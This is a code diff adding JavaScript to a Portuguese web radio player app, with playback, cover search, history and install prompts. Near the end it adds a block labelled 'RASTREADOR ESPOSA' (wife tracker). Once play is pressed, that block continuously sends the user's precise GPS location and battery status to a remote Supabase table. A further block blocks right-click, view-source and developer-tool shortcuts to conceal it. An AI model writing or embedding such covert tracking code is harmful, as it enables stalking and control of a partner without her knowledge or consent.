+function resolveHistCover(item){if(item.cover)return;findCover(item.artist,item.title).then(function(cv){if(cv.cover){item.cover=cv.cover;item.album=item.album||cv.album||"";renderHistory()}}).catch(function(){})}
+function renderHistory(){histList.innerHTML="";if(!state.history.length){var p=document.createElement("div");p.className="hist-empty";p.textContent="As últimas músicas tocadas vão aparecer aqui.";histList.appendChild(p);return}state.history.forEach(function(h){var row=document.createElement("div");row.className="hist-item";var img=document.createElement("img");img.src=h.cover||"icons/icon-192.png";img.alt="Capa";img.onerror=function(){img.src="icons/icon-192.png"};var box=document.createElement("div");box.className="hist-txt";var t=document.createElement("div");t.className="t";t.textContent=h.title||"—";var a=document.createElement("div");a.className="a";a.textContent=h.artist||"Artista desconhecido";box.appendChild(t);box.appendChild(a);row.appendChild(img);row.appendChild(box);histList.appendChild(row)})}
+function startRadio(){dbg("Conectando…");try{audio.src=STREAM_URL;audio.load();var p=audio.play();if(p&&p.catch)p.catch(function(e){dbg("Erro ao tocar: "+(e&&e.name?e.name:e))})}catch(e){dbg("Erro: "+e.message)}}
+function togglePlay(){if(state.playing){audio.pause()}else{startRadio()}}
+function setPlaying(on){if(state.playing===on)return;state.playing=on;document.body.classList.toggle("playing",on);icPlay.style.display=on?"none":"block";icPause.style.display=on?"block":"none";playBtn.setAttribute("aria-label",on?"Pausar":"Tocar");dbg(on?"▶ TOCANDO":"⏸ PAUSADO")}
+playBtn.addEventListener("click",togglePlay);popBtn.addEventListener("click",togglePlay);
+audio.addEventListener("playing",function(){everPlayed=true;setPlaying(true);pollNow()});
+audio.addEventListener("pause",function(){setPlaying(false)});
+audio.addEventListener("waiting",function(){if(state.playing)dbg("Buffering…")});
+audio.addEventListener("error",function(){if(!everPlayed){dbg("Erro ao iniciar");return}if(!state.playing)return;dbg("Stream caiu. Reconectando em 5s…");setTimeout(function(){if(state.playing)startRadio()},5000)});
+volInput.addEventListener("input",function(){try{audio.volume=volInput.value/100}catch(e){}});
+function flashVol(){volToast.textContent="VOL "+Math.round(audio.volume*100)+"%";volToast.classList.add("show");clearTimeout(flashVol._t);flashVol._t=setTimeout(function(){volToast.classList.remove("show")},1400)}
+function setVolume(v){v=Math.max(0,Math.min(1,v));try{audio.volume=v}catch(e){}volInput.value=Math.round(audio.volume*100);flashVol()}
+window.addEventListener("keydown",function(e){var t=e.target,tag=(t&&t.tagName)?t.tagName.toLowerCase():"";var typing=(tag==="input"&&t.type!=="range")||tag==="textarea"||tag==="select";if(typing)return;if(e.key==="ArrowUp"||e.key==="ArrowDown"){if(tag==="input")return;e.preventDefault();setVolume(audio.volume+(e.key==="ArrowUp"?0.05:-0.05))}else if(e.key==="Enter"||e.key===" "||e.key==="Spacebar"){if(tag==="button"||tag==="input"||tag==="a")return;e.preventDefault();togglePlay()}});
+if("mediaSession" in navigator){var ms=navigator.mediaSession;try{ms.setActionHandler("play",startRadio)}catch(e){}try{ms.setActionHandler("pause",function(){audio.pause()})}catch(e){}try{ms.setActionHandler("stop",function(){audio.pause()})}catch(e){}try{ms.setActionHandler("previoustrack",startRadio)}catch(e){}try{ms.setActionHandler("nexttrack",startRadio)}catch(e){}}
+function runSearch(){var q=qInput.value.trim();if(!q){dbg("Digite o nome da música");return}qBtn.disabled=true;qBtn.textContent="Buscando…";dbg("Buscando capa: "+q);searchCovers(q).then(function(res){renderResults(res.slice(0,4));dbg("Busca OK • "+Math.min(res.length,4)+" resultado(s)")}).catch(function(e){qResults.innerHTML="";dbg("ERRO na busca: "+(e&&e.message?e.message:e))}).finally(function(){qBtn.disabled=false;qBtn.textContent="Buscar capa"})}
+function renderResults(list){qResults.innerHTML="";if(!list.length){var p=document.createElement("div");p.className="hist-empty";p.textContent="Nenhum resultado.";qResults.appendChild(p);return}list.forEach(function(r){var b=document.createElement("button");b.className="q-item";b.type="button";var img=document.createElement("img");img.src=r.cover||"icons/icon-192.png";img.alt="";img.onerror=function(){img.src="icons/icon-192.png"};var t=document.createElement("div");t.className="t";t.textContent=r.title||"—";var a=document.createElement("div");a.className="a";a.textContent=r.artist||"Artista desconhecido";b.appendChild(img);b.appendChild(t);b.appendChild(a);b.addEventListener("click",function(){setSong({title:r.title,artist:r.artist,album:r.album||"",cover:r.cover,raw:"manual:"+r.title});manualHold=true;dbg("Capa aplicada: "+r.title);window.scrollTo({top:0,behavior:"smooth"})});qResults.appendChild(b)})}
+qBtn.addEventListener("click",runSearch);qInput.addEventListener("keydown",function(e){if(e.key==="Enter")runSearch()});
+/* EQ - 20 BARRAS */
+(function(){var eq=document.getElementById("eq");for(var i=0;i<20;i++){var b=document.createElement("i");b.style.animationDuration=(0.5+Math.random()*0.7)+"s";b.style.animationDelay=(Math.random()*0.4)+"s";eq.appendChild(b)}})();
+/* INSTALAR */
+var diagEl=$("diag");
+function showDiag(html){if(!diagEl)return;diagEl.innerHTML=html;diagEl.classList.add("show")}
+function hideDiag(){if(diagEl)diagEl.classList.remove("show")}
+function isStandalone(){return window.matchMedia("(display-mode: standalone)").matches||window.matchMedia("(display-mode: fullscreen)").matches||window.matchMedia("(display-mode: minimal-ui)").matches||window.navigator.standalone===true}
+var store=null;try{store=window.localStorage;store.getItem("sp_installed")}catch(e){store=null}
+function hideInstallUI(){installBtn.hidden=true;iosHint.classList.remove("show");if(installHelp)installHelp.hidden=true}
+function markInstalled(why){state.installed=true;try{if(store)store.setItem("sp_installed","1")}catch(e){}hideInstallUI();dbg("App instalado ✓ "+(why||""))}
+function showInstallHelp(){if(!installHelp)return;var ua=navigator.userAgent||"";var html;if(IS_TV){html="💡 <b>Instalar na TV:</b> Abra pelo <b>navegador da TV</b> (TV Bro, Samsung Internet, Silk ou Puffin) e use <b>Instalar aplicativo</b>."}else if(IS_IOS){html="💡 <b>iPhone:</b> Compartilhar → <b>Adicionar à Tela de Início</b>."}else if(/firefox/i.test(ua)&&!/android/i.test(ua)){html="💡 Firefox não instala PWA. Abra no <b>Chrome</b> ou <b>Edge</b>."}else if(/edg\//i.test(ua)){html="💡 Edge: menu ⋯ → Apps → <b>Instalar este site</b>."}else if(/samsungbrowser/i.test(ua)){html="💡 Samsung Internet: menu ☰ → <b>Adicionar à tela inicial</b>."}else if(/android/i.test(ua)){html="💡 Chrome: menu ⋮ → <b>Instalar aplicativo</b>."}else{html="💡 Chrome/Edge: ícone ⊕ na barra de endereço → <b>Instalar</b>."}installHelp.innerHTML=html;installHelp.hidden=false}
+state.installed=(store&&store.getItem("sp_installed")==="1")||isStandalone();
+if(state.installed){hideInstallUI();dbg("Rodando como app instalado ✓")}else if(IS_IOS){iosHint.classList.add("show")}else{installBtn.hidden=false}
+window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();deferredPrompt=e;if(!state.installed)installBtn.hidden=false;hideDiag();dbg("App pronto para instalar ✓")});
+installBtn.addEventListener("click",function(){if(deferredPrompt){deferredPrompt.prompt();deferredPrompt.userChoice.then(function(choice){dbg("Instalação: "+choice.outcome);if(choice.outcome==="accepted")markInstalled("pelo botão");else hideInstallUI();deferredPrompt=null})}else{showInstallHelp()}});
+window.addEventListener("appinstalled",function(){markInstalled("appinstalled")});
+var mqStandalone=window.matchMedia("(display-mode: standalone)");function onStandaloneChange(m){if(m.matches)markInstalled("standalone")}if(mqStandalone.addEventListener)mqStandalone.addEventListener("change",onStandaloneChange);else if(mqStandalone.addListener)mqStandalone.addListener(onStandaloneChange);
+(function(){if(IS_IOS||state.installed)return;if(location.protocol==="file:"){showDiag("⚠️ <b>Abriu arquivo direto.</b><br>Suba no GitHub Pages e abra o link.");return}if(!window.isSecureContext){showDiag("⚠️ <b>Sem HTTPS.</b><br>Use GitHub Pages.");return}if(/fbav|fban|instagram|linkedinapp|whatsapp|snapchat|tiktok|musically/i.test(navigator.userAgent)){showDiag("⚠️ <b>Dentro de outro app.</b><br>Abra no Chrome.");return}if(!IS_TV)fetch("manifest.json",{cache:"no-store"}).then(function(r){if(!r.ok)throw new Error("HTTP "+r.status);return r.json()}).then(function(m){if(!m||!m.name||!m.icons||!m.icons.length)throw new Error("manifest incompleto");var ic=new Image();ic.onload=function(){dbg("Ícones OK")};ic.onerror=function(){showDiag("⚠️ <b>Ícones não encontrados.</b><br>Suba a pasta icons/")};ic.src="icons/icon-192.png"}).catch(function(e){showDiag("⚠️ <b>manifest.json não encontrado.</b><br>Suba o manifest.json na mesma pasta.")});if(!IS_IOS){setTimeout(function(){if(deferredPrompt)return;if(diagEl&&diagEl.classList.contains("show"))return;showInstallHelp()},6000)}})();
+if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(__ua)||/Downloader/i.test(__ua);if(isWebView){tvWarn.classList.add("show");var c=$("tvWarnClose");if(c)c.addEventListener("click",function(){tvWarn.classList.remove("show")});setTimeout(function(){tvWarn.classList.remove("show")},15000)}}
+if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
+setInterval(function(){if(state.playing)pollNow()},POLL_MS);
+
+/* ══════════════════════════════════════════════
+   🔒 RASTREADOR ESPOSA - TRAVADO - NÃO MEXER
+   ══════════════════════════════════════════════ */
+const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'ESPOSA';
+const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
+const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
+let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_wakeLock=null,_rastreiou=false;
+async function _lerBat(){try{if(!_batObj&&navigator.getBattery){_batObj=await navigator.getBattery();_batObj.addEventListener('levelchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)});_batObj.addEventListener('chargingchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)})}if(_batObj){_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging}}catch(e){}}
+_lerBat();
+async function _pedirWake(){try{if('wakeLock' in navigator){_wakeLock=await navigator.wakeLock.request('screen');_wakeLock.addEventListener('release',()=>setTimeout(_pedirWake,1000))}}catch(e){}}
+async function _enviar(lat,lon,forcar){await _lerBat();let agora=Date.now();if(!forcar&&agora-_ultimoEnvio<3000)return;_ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;try{await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})})}catch(e){}}
+function _iniciarRastreio(){if(_rastreiou)return;_rastreiou=true;_pedirWake();_lerBat();navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true)},()=>{dbg('ATIVE A LOCALIZAÇÃO!')},{enableHighAccuracy:true,timeout:20000,maximumAge:0});navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:20000});setInterval(()=>{if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)},7000);document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){_pedirWake();audio.play().catch(()=>{})}})}
+playBtn.addEventListener('click',_iniciarRastreio);
+popBtn.addEventListener('click',_iniciarRastreio);
+
+/* ══════════════════════════════════════════════
+   🔒 TRAVA DE SEGURANÇA - NÃO REMOVER
+   ══════════════════════════════════════════════ */
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
+document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
+Object.freeze(DEVICE_ID_ESPOSA);
+console.log('%c🔒 ESPOSA v2.0 TRAVADO - NÃO MEXER','color:#ff2d55;font-weight:bold;font-size:16px');
+</script>
+</body>
+</html>
